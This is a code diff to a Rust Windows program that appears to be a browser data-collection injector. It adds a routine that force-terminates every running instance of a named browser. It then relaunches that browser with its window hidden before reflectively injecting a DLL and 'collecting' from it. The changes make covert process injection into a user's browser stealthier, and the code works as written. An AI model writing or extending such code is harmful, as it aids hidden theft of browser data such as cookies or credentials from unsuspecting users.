@@ -19,6 +19,7 @@ use windows_sys::Win32::System::Memory::*;
 use windows_sys::Win32::System::Pipes::*;
 use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE};
+use windows_sys::Win32::UI::WindowsAndMessaging::*;
 
 use crate::bootstrapper::{realign_pe, realign_pe_end, DllInfo};
 
@@ -110,6 +111,37 @@ fn find_browser_exe(name: &str) -> Option<String> {
         }
     }
     None
+}
+
+unsafe fn kill_processes_by_name(exe_name: &str) {
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snapshot == INVALID_HANDLE_VALUE {
+        return;
+    }
+
+    let mut entry: PROCESSENTRY32W = std::mem::zeroed();
+    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+
+    if Process32FirstW(snapshot, &mut entry) != 0 {
+        loop {
+            let current_exe = String::from_utf16_lossy(&entry.szExeFile);
+            let current_exe = current_exe.trim_matches('\0');
+
+            if current_exe.to_lowercase() == exe_name.to_lowercase() {
+                let h_process = OpenProcess(PROCESS_TERMINATE, 0, entry.th32ProcessID);
+                if h_process != 0 {
+                    TerminateProcess(h_process, 0);
+                    CloseHandle(h_process);
+                }
+            }
+
+            if Process32NextW(snapshot, &mut entry) == 0 {
+                break;
+            }
+        }
+    }
+
+    CloseHandle(snapshot);
 }
 
 unsafe fn inject_dll_reflective(h_process: HANDLE, dll_bytes: &[u8]) {
@@ -213,8 +245,13 @@ fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) {
     let mut cmd_line: Vec<u16> = OsStr::new(browser_config.exe_name).encode_wide().chain(Some(0)).collect();
 
     unsafe {
+        kill_processes_by_name(browser_config.exe_name);
+
         let mut startup_info: STARTUPINFOW = std::mem::zeroed();
         startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+        startup_info.dwFlags = STARTF_USESHOWWINDOW;
+        startup_info.wShowWindow = SW_HIDE as u16;
+
         let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
 
         let mut success = CreateProcessW(
